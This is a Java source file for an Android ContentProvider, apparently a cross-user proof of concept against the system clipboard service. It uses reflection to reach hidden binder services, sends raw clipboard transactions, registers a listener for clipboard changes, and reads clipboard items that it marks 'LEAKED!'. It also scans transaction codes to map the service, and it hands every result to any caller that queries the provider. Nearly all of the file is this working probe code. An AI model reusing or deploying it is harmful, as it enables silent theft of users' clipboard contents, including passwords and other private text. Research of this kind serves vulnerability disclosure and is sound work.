package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

public class ClipboardMonitorProvider extends ContentProvider {

    private static final AtomicInteger clipChanges = new AtomicInteger(0);
    private static final AtomicReference<String> lastClipEvent = new AtomicReference<>("none");
    private static IBinder clipListenerBinder;

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("register")) {
            registerClipboardListener(cursor);
        } else if (path != null && path.contains("status")) {
            cursor.addRow(new Object[]{"clipChanges", String.valueOf(clipChanges.get())});
            cursor.addRow(new Object[]{"lastEvent", lastClipEvent.get()});
        } else if (path != null && path.contains("read")) {
            attemptClipboardRead(cursor);
        } else {
            // Default: register + status + read attempt
            registerClipboardListener(cursor);
            cursor.addRow(new Object[]{"clipChanges", String.valueOf(clipChanges.get())});
            attemptClipboardRead(cursor);
            testClipboardHasPrimary(cursor);
        }

        return cursor;
    }

    private void registerClipboardListener(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("clipboard");
        if (binder == null) { cursor.addRow(new Object[]{"clipboard", "no_binder"}); return; }
        String desc = "android.content.IClipboard";

        // Create a proper listener that tracks callbacks
        final CountDownLatch latch = new CountDownLatch(1);
        clipListenerBinder = new android.os.Binder() {
            @Override
            protected boolean onTransact(int code, Parcel d, Parcel r, int flags) {
                clipChanges.incrementAndGet();
                lastClipEvent.set("cb! code=" + code + " time=" + System.currentTimeMillis());
                latch.countDown();
                return true;
            }
            @Override
            public String getInterfaceDescriptor() {
                return "android.content.IOnPrimaryClipChangedListener";
            }
        };

        // TX=7: addPrimaryClipChangedListener(IOnPrimaryClipChangedListener, String pkg,
        //        String featureId, int userId, int deviceId)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeStrongBinder(clipListenerBinder);
            data.writeString(getContext().getPackageName());
            data.writeString(null); // featureId
            data.writeInt(0); // userId
            data.writeInt(0); // deviceId
            binder.transact(7, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                cursor.addRow(new Object[]{"registerListener", "SUCCESS"});

                // Wait briefly for any immediate callback
                boolean got = latch.await(2, TimeUnit.SECONDS);
                if (got) {
                    cursor.addRow(new Object[]{"immediateCallback", lastClipEvent.get()});
                } else {
                    cursor.addRow(new Object[]{"immediateCallback", "none (expected)"});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"registerListener", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"registerListener", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();
    }

    private void attemptClipboardRead(MatrixCursor cursor) {
        // Try reading clipboard content via the ClipboardManager API
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager)
                getContext().getSystemService("clipboard");

            // hasPrimaryClip
            boolean has = cm.hasPrimaryClip();
            cursor.addRow(new Object[]{"hasPrimaryClip_api", String.valueOf(has)});

            if (has) {
                // getPrimaryClip - this is what's restricted in background
                android.content.ClipData clip = cm.getPrimaryClip();
                if (clip != null) {
                    cursor.addRow(new Object[]{"clipDescription", clip.getDescription().toString()});
                    for (int i = 0; i < Math.min(clip.getItemCount(), 3); i++) {
                        android.content.ClipData.Item item = clip.getItemAt(i);
                        String text = item.getText() != null ? item.getText().toString() : "null";
                        cursor.addRow(new Object[]{"clip_item_" + i, "LEAKED! " + truncate(text)});
                    }
                } else {
                    cursor.addRow(new Object[]{"getPrimaryClip", "null (access denied?)"});
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clipRead", "ERR:" + e.getClass().getSimpleName() + ":" + truncate(e.getMessage())});
        }
    }

    private void testClipboardHasPrimary(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("clipboard");
        if (binder == null) return;
        String desc = "android.content.IClipboard";

        // TX=4: hasPrimaryClip(String pkg, String featureId, int userId, int deviceId)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(0);
            data.writeInt(0);
            binder.transact(4, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int has = reply.readInt();
                cursor.addRow(new Object[]{"hasPrimaryClip_binder", "has=" + has});
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"hasPrimaryClip_binder", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"hasPrimaryClip_binder", "ERR"});
        }
        data.recycle();
        reply.recycle();

        // TX=5: hasClipboardText(String pkg, String featureId, int userId, int deviceId)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(0);
            data.writeInt(0);
            binder.transact(5, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int hasText = reply.readInt();
                cursor.addRow(new Object[]{"hasClipboardText", "hasText=" + hasText});
            } else {
                cursor.addRow(new Object[]{"hasClipboardText", "Ex=" + ex});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"hasClipboardText", "ERR"});
        }
        data.recycle();
        reply.recycle();

        // TX=9: getClipboardAccessPermissions(String pkg, String featureId, int userId, int deviceId)
        // This might reveal what access we have
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            data.writeInt(0);
            data.writeInt(0);
            binder.transact(9, data, reply, 0);
            int ex = reply.readInt();
            if (ex == 0) {
                int avail = reply.dataAvail();
                if (avail >= 4) {
                    int perms = reply.readInt();
                    cursor.addRow(new Object[]{"clipPerms", "perms=0x" + Integer.toHexString(perms)});
                } else {
                    cursor.addRow(new Object[]{"clipPerms", "SUCCESS avail=" + avail});
                }
            } else {
                String msg = reply.readString();
                cursor.addRow(new Object[]{"clipPerms", "Ex=" + ex + "|" + truncate(msg)});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"clipPerms", "ERR:" + e.getClass().getSimpleName()});
        }
        data.recycle();
        reply.recycle();

        // Scan remaining TX codes to map the clipboard service
        for (int tx = 1; tx <= 12; tx++) {
            if (tx == 4 || tx == 5 || tx == 7 || tx == 9) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(0);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (!result) {
                    cursor.addRow(new Object[]{"clip_tx" + tx, "NO_SUCH_TX"});
                } else {
                    int ex2 = reply.readInt();
                    if (ex2 == 0) {
                        cursor.addRow(new Object[]{"clip_tx" + tx, "SUCCESS avail=" + reply.dataAvail()});
                    } else {
                        String msg = reply.readString();
                        cursor.addRow(new Object[]{"clip_tx" + tx, "Ex=" + ex2 + "|" + truncate(msg)});
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"clip_tx" + tx, "THROW:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
